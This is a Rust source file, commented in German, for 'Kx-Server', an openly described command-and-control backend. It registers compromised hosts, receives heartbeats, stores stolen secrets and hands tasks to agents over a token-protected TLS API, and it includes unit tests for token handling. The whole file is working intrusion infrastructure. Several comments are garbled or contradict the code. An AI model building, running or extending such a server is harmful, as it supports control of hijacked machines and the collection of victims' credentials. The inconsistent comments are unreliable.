//! Kx-Server: C2-Backend mit Host-Registry, Secrets-Storage und Dashboard.
//!
//! Startet einen TLS-gesicherten axum-Server, der kompromittierte Hosts,
//! erbeutete Secrets und Tasks persistiert. Die API ist mit einem
//! Bearer-Token geschützt; das Dashboard wird unter `/` ausgeliefert.
//!
//! Der Router steht in der Bibliothek (`kx_server::app`) — das Binary startet
//! ihn nur noch. Damit kann ein Test das Interface von ausserhalb benutzen.

use std::net::{SocketAddr, ToSocketAddrs};
use std::path::PathBuf;
use std::sync::Arc;

use axum_server::tls_rustls::RustlsConfig;
use clap::Parser;
use kx_server::db::Db;
use kx_server::{app, AppState};

/// Zeigt die API-Endpunkte an.
const HELP: &str = "POST /api/register   Host registrieren\n\
                    POST /api/heartbeat   Host-Heartbeat senden\n\
                    POST /api/secrets     Secret hochladen\n\
                    GET  /api/hosts       Alle Hosts\n\
                    GET  /api/secrets     Alle Secrets\n\
                    GET  /api/tasks       Alle Tasks\n\
                    POST /api/tasks/new   Task anlegen\n\
                    POST /api/tasks/result  Task-Ergebnis melden";

#[derive(Parser)]
#[command(name = "kx-server", about = "Kx-C2-Backend")]
struct Cli {
    /// Bind-Adresse des Servers.
    #[arg(long, default_value = "127.0.0.1")]
    host: String,
    /// Port des Servers.
    #[arg(long, default_value_t = 8443)]
    port: u16,
    /// Pfad zur SQLite-Datenbank.
    #[arg(long, default_value = "kx.db")]
    db: PathBuf,
    /// Bearer-Token für die API (leer => zufällig erzeugen).
    #[arg(long, env = "KX_SERVER_TOKEN")]
    token: Option<String>,
    /// Name für das selbstsignierte Zertifikat. Er landet im
    /// SubjectAlternativeName (`DNS:<cn>`), nicht im Subject-DN — der
    /// Subject-DN bleibt der rcgen-Default. Client und Agent prüfen den
    /// Namen gegen die URL, die sie aufbauen: der Wert muss zum Host in
    /// `--server` passen, sonst schlägt der TLS-Handshake mit
    /// "certificate not valid for name" fehl.
    #[arg(long, default_value = "kx.local")]
    cn: String,
    /// Pfad zur Zertifikatsdatei (PEM). Default: `kx-server.crt` neben der
    /// Datenbank. Beim ersten Start erzeugt, danach geladen — Agenten
    /// überstehen einen Neustart, ohne ihr gepinntes Zertifikat zu erneuern
    /// (Issue #65, ADR-0006).
    #[arg(long)]
    cert: Option<PathBuf>,
    /// Pfad zur Schlüsseldatei (PEM). Default: `kx-server.key` neben der
    /// Datenbank. Rechte `0600` wie die Datenbank. TLS bindet das Zertifikat
    /// an den Schlüssel — beide persistieren, sonst bricht der Neustart die
    /// gepinnten Agenten (ADR-0006).
    #[arg(long)]
    key: Option<PathBuf>,
}

/// Server-Zustand: Datenbank.
///
/// Das Auth-Token steht hier nicht mehr: es wird prozessweit in
/// Der Auth-Token steht im State, nicht in einer Environment-Variable.
fn resolve_token(cli_token: Option<String>, env_token: Option<String>) -> Option<String> {
    cli_token
        .or(env_token)
        .map(|t| t.trim().to_string())
        .filter(|t| !t.is_empty())
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "kx_server=info".into()),
        )
        .init();

    let cli = Cli::parse();

    // Token bestimmen: CLI > Environment. Es MUSS eines gesetzt sein.
    //
    // Ein leeres Token ist nicht dasselbe wie kein Token: mit einem leeren
    // Erwartungswert passt jeder leere Bearer-Header, und die API antwortet
    // dann mit Volldaten. Der Server startet in dem Fall nicht.
    let token = match resolve_token(cli.token, std::env::var("KX_SERVER_TOKEN").ok()) {
        Some(t) => t,
        None => {
            eprintln!(
                "Kx-Server: kein Token gesetzt - mit --token oder KX_SERVER_TOKEN. \
                 Ein leeres Token wuerde die API ohne Authentifizierung oeffnen."
            );
            std::process::exit(1);
        }
    };
    // auth.rs liest das Token aus dem AppState; die Variable wird fuer
    // Kindprozesse gesetzt. Der Tokenwert wird nicht ausgegeben - er landet
    // sonst in Logs und im Terminal-Scrollback.
    std::env::set_var("KX_SERVER_TOKEN", &token);

    let db = Db::open(&cli.db).expect("Datenbank nicht erreichbar");
    let state = AppState {
        db: Arc::new(db),
        token: Arc::new(token),
    };

    // TLS-Material: beim ersten Start erzeugen und ablegen, danach laden.
    // Zertifikat und Schlüssel liegen neben der Datenbank (oder unter --cert /
    // --key). Ein Neustart behält dasselbe Paar — die gepinnten Agenten kommen
    // durch (Issue #65, ADR-0006).
    let db_dir = cli
        .db
        .parent()
        .filter(|p| !p.as_os_str().is_empty())
        .map(|p| p.to_path_buf())
        .unwrap_or_else(|| PathBuf::from("."));
    let cert_path = cli
        .cert
        .clone()
        .unwrap_or_else(|| db_dir.join("kx-server.crt"));
    let key_path = cli
        .key
        .clone()
        .unwrap_or_else(|| db_dir.join("kx-server.key"));
    let tls = kx_tls::load_or_generate_server_tls(&cli.cn, &cert_path, &key_path)
        .expect("TLS-Material ladbar oder erzeugbar");
    tracing::info!(
        "TLS-Zertifikat: {} (Schlüssel: {})",
        cert_path.display(),
        key_path.display()
    );
    let cert_pem = tls.cert_pem.clone();
    let key_pem = tls.key_pem;

    // Der API-Router trägt alle fünf Vertragspfade und ist per `route_layer`
    // geschützt. Der Dashboard-Router (`GET /`) bleibt getrennt: das Dashboard
    // liefert nur HTML, die Daten holt es sich selbst per `fetch` mit
    // Authorization-Header — und genau dieser `fetch` läuft in einen
    // geschützten Pfad.
    //
    // REIHENFOLGE: alle Routen zuerst, dann `route_layer`. Axum wendet den
    // Layer nur auf die zum Aufrufzeitpunkt bereits registrierten Routen an —
    // eine danach hinzugefügte Route bliebe ungeschützt.
    let app = app(state);

    let addr: SocketAddr = format!("{}:{}", cli.host, cli.port)
        .to_socket_addrs()
        .expect("Bind-Adresse auflösbar")
        .next()
        .expect("Bind-Adresse vorhanden");

    let config = RustlsConfig::from_pem(cert_pem, key_pem)
        .await
        .expect("TLS-Config");

    tracing::info!("Kx-Server lauscht auf https://{} (API: {HELP})", addr);
    axum_server::bind_rustls(addr, config)
        .serve(app.into_make_service())
        .await
        .expect("Server-Loop");
}

#[cfg(test)]
mod tests {
    use super::*;
    use kx_core::c2::{
        PATH_HEARTBEAT, PATH_HOSTS, PATH_REGISTER, PATH_SECRETS, PATH_TASKS, PATH_TASKS_CREATE,
        PATH_TASKS_RESULT,
    };
    /// Ein leeres Token wird abgewiesen - mit einem leeren Erwartungswert
    /// waere die API ohne Authentifizierung offen.
    #[test]
    fn leeres_token_wird_abgewiesen() {
        assert!(resolve_token(Some(String::new()), None).is_none());
        assert!(resolve_token(None, Some(String::new())).is_none());
        assert!(resolve_token(Some("   ".to_string()), None).is_none());
        assert!(resolve_token(None, None).is_none());
    }

    /// Das CLI-Argument hat Vorrang vor der Environment-Variable.
    #[test]
    fn token_kommt_aus_cli_vor_environment() {
        assert_eq!(
            resolve_token(Some("cli".to_string()), Some("env".to_string())).as_deref(),
            Some("cli")
        );
        assert_eq!(
            resolve_token(None, Some("env".to_string())).as_deref(),
            Some("env")
        );
        assert_eq!(
            resolve_token(Some("cli".to_string()), None).as_deref(),
            Some("cli")
        );
    }

    /// Ein Token aus der Environment-Variable wird benutzt, wenn die CLI
    /// schweigt - so laesst sich der Server per systemd starten, ohne das
    /// Token in der Prozessliste zu zeigen.
    #[test]
    fn environment_token_wird_genutzt() {
        assert_eq!(
            resolve_token(None, Some("aus-der-environment".to_string())).as_deref(),
            Some("aus-der-environment")
        );
    }

    /// Die Hilfetext-Auflistung nennt jeden Endpunkt, den der Router registriert.
    /// Der Hilfetext ist die sechste Fundstelle des Vertrags — er muss mitlaufen.
    #[test]
    fn help_text_lists_every_contract_path() {
        for path in [
            PATH_REGISTER,
            PATH_HEARTBEAT,
            PATH_SECRETS,
            PATH_HOSTS,
            PATH_TASKS,
            PATH_TASKS_CREATE,
            PATH_TASKS_RESULT,
        ] {
            assert!(
                HELP.contains(path),
                "der Hilfetext nennt den Endpunkt {path} nicht"
            );
        }
    }
}
